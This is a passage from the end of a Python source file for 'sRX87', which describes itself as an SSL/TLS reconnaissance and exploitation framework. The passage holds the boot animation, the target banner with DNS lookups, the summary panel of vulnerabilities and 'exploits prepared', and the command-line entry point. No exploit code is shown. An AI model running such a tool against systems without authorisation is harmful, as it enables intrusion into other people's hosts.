        print(pad + MUTED + "  12 stages · real oracles · no stubs · sequential reveal" + A.RESET)
        print(pad + MUTED + "  " + GLYPH_CTRL + "  Ctrl+C exits cleanly · ↑↓ scroll · q quits" + A.RESET)
        print()
        sys.stdout.flush()
        time.sleep(0.2)
        cls._rain(1.2)
        print()
        sys.stdout.write("  " + BRAND + GLYPH_ARROW + " " + A.RESET)
        cls._type("initialising subsystems", VALUE, 0.003)
        print()
        total = len(cls.SUBS)
        for i, (name, valfn, okfn) in enumerate(cls.SUBS):
            pct = 100.0 * (i + 1) / total
            try:
                desc = valfn()
            except Exception as e:
                desc = "error: %s" % e
            try:
                ok = bool(okfn())
            except Exception:
                ok = False
            icon = (OK + GLYPH_CHECK) if ok else (WARN + GLYPH_WARN)
            nm = LABEL + vpad(name, 20) + A.RESET
            dm = VALUE2 + vpad(vtrunc(str(desc), 62), 62) + A.RESET
            bar = cls._bar(pct, 22, OK if ok else WARN)
            sys.stdout.write("  " + BRAND + GLYPH_ARROW + A.RESET + " " + nm + "  " +
                             dm + "  " + bar + " " + icon + A.RESET + "\n")
            sys.stdout.flush()
            time.sleep(random.uniform(0.025, 0.06))
        print()
        sys.stdout.write("  " + OK + GLYPH_CHECK + "  boot complete" + A.RESET +
                         "  " + MUTED + "all subsystems nominal" + A.RESET + "\n")
        sys.stdout.write("  " + MUTED + "switching to alt screen buffer in 0.4s…" + A.RESET + "\n")
        print()
        sys.stdout.flush()
        time.sleep(0.4)


def print_target_banner(target):
    print()
    print("  " + BRAND + GLYPH_ARROW + A.RESET + " " + LABEL + vpad("target", 10) +
          A.RESET + " " + VALUE + target.uri() + A.RESET)
    print("  " + BRAND + GLYPH_ARROW + A.RESET + " " + LABEL + vpad("scheme", 10) +
          A.RESET + " " + VALUE + target.scheme + A.RESET)
    if target.path != "/":
        print("  " + BRAND + GLYPH_ARROW + A.RESET + " " + LABEL + vpad("path", 10) +
              A.RESET + " " + VALUE + target.path + A.RESET)
    a = resolve_a(target.host)
    if a:
        print("  " + BRAND + GLYPH_ARROW + A.RESET + " " + LABEL + vpad("dns.a", 10) +
              A.RESET + " " + VALUE + ", ".join(a[:6]) + A.RESET)
    aaaa = resolve_aaaa(target.host)
    if aaaa:
        print("  " + BRAND + GLYPH_ARROW + A.RESET + " " + LABEL + vpad("dns.aaaa", 10) +
              A.RESET + " " + VALUE + ", ".join(aaaa[:4]) + A.RESET)
    cn = resolve_cname(target.host)
    if cn:
        print("  " + BRAND + GLYPH_ARROW + A.RESET + " " + LABEL + vpad("dns.cname", 10) +
              A.RESET + " " + VALUE + " → ".join([target.host] + cn) + A.RESET)
    print()
    sys.stdout.flush()


def _stage12_post_scan_summary(kb):
    snapshot = _report_full_snapshot(kb)
    findings = snapshot["findings"]
    counts = _StdCounter()
    for cat_key in ("vulnerabilities", "exploits", "bypasses"):
        for finding in findings.get(cat_key, []):
            sev, cvss = _report_severity(finding)
            counts[sev] += 1
    return {
        "target": kb.get("meta.target", "?"),
        "vulns": len(findings["vulnerabilities"]),
        "bypasses": len(findings["bypasses"]),
        "exploits": len(findings["exploits"]),
        "severities": dict(counts),
        "kb_size": len(kb.keys()),
        "connections": COUNTERS.get("connections", 0),
        "stages_run": len(STAGES),
        "reports": {name: os.path.getsize(_report_path(name))
                    if os.path.exists(_report_path(name)) else 0
                    for name in REPORT_FILES.keys()},
    }


def _stage12_print_final_panel():
    try:
        if SCR.running:
            SCR.stop()
    except Exception:
        pass
    try:
        sys.stdout.write(CLEAR + CUR_HOME)
        sys.stdout.flush()
    except Exception:
        pass
    summary = KB.get("stage12.post_scan_summary") or _stage12_post_scan_summary(KB)
    target = summary.get("target", "?")
    vulns = summary.get("vulns", 0)
    bypasses = summary.get("bypasses", 0)
    exploits = summary.get("exploits", 0)
    sev = summary.get("severities", {})
    kb_size = summary.get("kb_size", 0)
    conns = summary.get("connections", 0)
    stages_run = summary.get("stages_run", 0)
    w = min(term_size()[0], 100)
    pad = " " * max(0, (w - 76) // 2)
    print()
    print(pad + BRAND + "╔" + "═" * 74 + "╗" + A.RESET)
    print(pad + BRAND + "║" + A.RESET + vpad("  sRX87 · FINAL SUMMARY", 74) +
          BRAND + "║" + A.RESET)
    print(pad + BRAND + "╚" + "═" * 74 + "╝" + A.RESET)
    print()

    def _line(label, value, colour=VALUE):
        lab = LABEL + vpad(label, 22) + A.RESET
        val = colour + str(value) + A.RESET
        print(pad + "  " + lab + MUTED + GLYPH_DOT + A.RESET + "  " + val)

    _line("Target", target, BRAND)
    print()
    _line("Vulnerabilities", vulns, DANGER if vulns else OK)
    _line("Exploits prepared", exploits, DANGER if exploits else OK)
    _line("Bypasses", bypasses, WARN if bypasses else OK)
    print()
    _line("Critical", sev.get("CRITICAL", 0),
          DANGER if sev.get("CRITICAL", 0) else MUTED)
    _line("High", sev.get("HIGH", 0), DANGER2 if sev.get("HIGH", 0) else MUTED)
    _line("Medium", sev.get("MEDIUM", 0), WARN if sev.get("MEDIUM", 0) else MUTED)
    _line("Low", sev.get("LOW", 0), OK if sev.get("LOW", 0) else MUTED)
    print()
    _line("KB keys", kb_size, ACCENT)
    _line("Connections", conns, BRAND)
    _line("Stages run", stages_run, BRAND)
    print()
    print(pad + "  " + LABEL + "Reports written to:" + A.RESET + " " +
          VALUE + _report_dir() + "/" + A.RESET)
    reports = summary.get("reports", {})
    shown = 0
    for name, fname in REPORT_FILES.items():
        size = reports.get(name, 0)
        if size > 0:
            icon = OK + GLYPH_CHECK + A.RESET
            print(pad + "    " + icon + "  " + VALUE2 + vpad(fname, 32) + A.RESET +
                  MUTED + human_bytes(size) + A.RESET)
            shown += 1
    if shown == 0:
        print(pad + "    " + MUTED + "(none — reports did not write)" + A.RESET)
    print()
    print(pad + BRAND + "  author: SYLHETYHACKVENGER (THE-ERROR808)" + A.RESET)
    print(pad + MUTED + "  " + GLYPH_CTRL + "  scan complete. Terminal restored." + A.RESET)
    print()
    try:
        sys.stdout.flush()
    except Exception:
        pass


def _install_post_scan_hook():
    original_run_all = StageOrchestrator.run_all

    def wrapped_run_all(self):
        original_run_all(self)
        try:
            summary = _stage12_post_scan_summary(KB)
            KB.set("stage12.post_scan_summary", summary)
            try:
                _t12_19_summary_text(lambda x: None, lambda k, v: KB.set(k, v), KB)
                _t12_20_exec_verdict(lambda x: None, lambda k, v: KB.set(k, v), KB)
            except Exception:
                pass
        except Exception:
            pass

    StageOrchestrator.run_all = wrapped_run_all


_install_post_scan_hook()


def run_cli(target_raw, no_boot=False, list_stages=False):
    try:
        target = Target(target_raw)
    except Exception as e:
        sys.stderr.write(DANGER + "error: " + str(e) + A.RESET + "\n")
        return 2
    if list_stages:
        if not STAGES:
            print(MUTED + "no stages registered" + A.RESET)
            return 0
        for s in STAGES:
            print("%02d  %-32s  %-52s  %d tests" % (s.index, s.name, s.title, len(s.tests)))
        print()
        print("total: %d stages, %d tests" % (len(STAGES), sum(len(s.tests) for s in STAGES)))
        return 0
    if not no_boot:
        Boot.run()
    else:
        sys.stdout.write(CLR_SCR + CUR_HOME)
    print_target_banner(target)
    KB.set("meta.target", target.uri())
    KB.set("meta.target_raw", target.raw)
    KB.set("meta.host", target.host)
    KB.set("meta.port", target.port)
    KB.set("meta.scheme", target.scheme)
    KB.set("meta.path", target.path)
    KB.set("meta.query", target.query)
    KB.set("meta.start_ts", time.time())
    KB.set("meta.start_iso", now_iso())
    KB.set("meta.python", "%d.%d.%d" % sys.version_info[:3])
    KB.set("meta.platform", platform.platform())
    KB.set("meta.hostname_local", platform.node())
    KB.set("meta.author", "SYLHETYHACKVENGER (THE-ERROR808)")
    count("connections", 0)
    if not STAGES:
        print("  " + WARN + GLYPH_WARN + "  no stages registered" + A.RESET)
        print("  " + MUTED + "  stage modules did not load — this is a bug" + A.RESET)
        print()
        return 0
    SCR.set_header(
        left=" " + BRAND + "sRX87" + A.RESET + " " + MUTED + GLYPH_DOT + A.RESET + " " +
             VALUE + target.uri() + A.RESET + " " + MUTED + GLYPH_DOT + A.RESET + " " +
             LABEL + "booting" + A.RESET,
        right=BRAND + "00:00:00" + A.RESET + " ",
    )
    SCR.set_footer(
        left=" " + MUTED + "conn 0 │ finds 0 │ vulns 0 │ bypass 0 │ exploit 0 │ [↑↓ PgUp PgDn g G] Ctrl+C " + GLYPH_CTRL + A.RESET,
        right=BRAND + "sRX87" + A.RESET + " ",
    )
    SCR.start()
    try:
        orch = StageOrchestrator(SCR, KB)
        for s in STAGES:
            orch.register(s)
        orch.run_all()
        while SCR.running and not ABORT.is_set():
            time.sleep(0.3)
    except KeyboardInterrupt:
        ABORT.set()
    finally:
        SCR.stop()
    try:
        _stage12_print_final_panel()
    except Exception:
        pass
    return 0


def main():
    p = argparse.ArgumentParser(prog="srx87",
                                 description="sRX87 SSL/TLS reconnaissance & exploitation framework - author SYLHETYHACKVENGER (THE-ERROR808)")
    p.add_argument("target", nargs="?", help="target URI (e.g. tcp://host:443)")
    p.add_argument("--no-boot", action="store_true", help="skip boot animation")
    p.add_argument("--list-stages", action="store_true", help="list registered stages")
    p.add_argument("--stage", type=int, default=None, help="run only this stage index")
    args = p.parse_args()
    guard = SignalGuard()
    guard.install()
    try:
        if args.stage is not None:
            STAGES[:] = [s for s in STAGES if s.index == args.stage]
        if not args.target:
            try:
                sys.stdout.write(BRAND + "  target " + A.RESET + MUTED + "» " + A.RESET)
                sys.stdout.flush()
                raw = input().strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return 130
            if not raw:
                sys.stderr.write(DANGER + "error: no target" + A.RESET + "\n")
                return 2
            return run_cli(raw, no_boot=args.no_boot, list_stages=args.list_stages)
        return run_cli(args.target, no_boot=args.no_boot, list_stages=args.list_stages)
    except KeyboardInterrupt:
        try:
            SCR.stop()
        except Exception:
            pass
        return 130
    finally:
        guard.restore()


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        try:
            SCR.stop()
        except Exception:
            pass
        sys.exit(130)
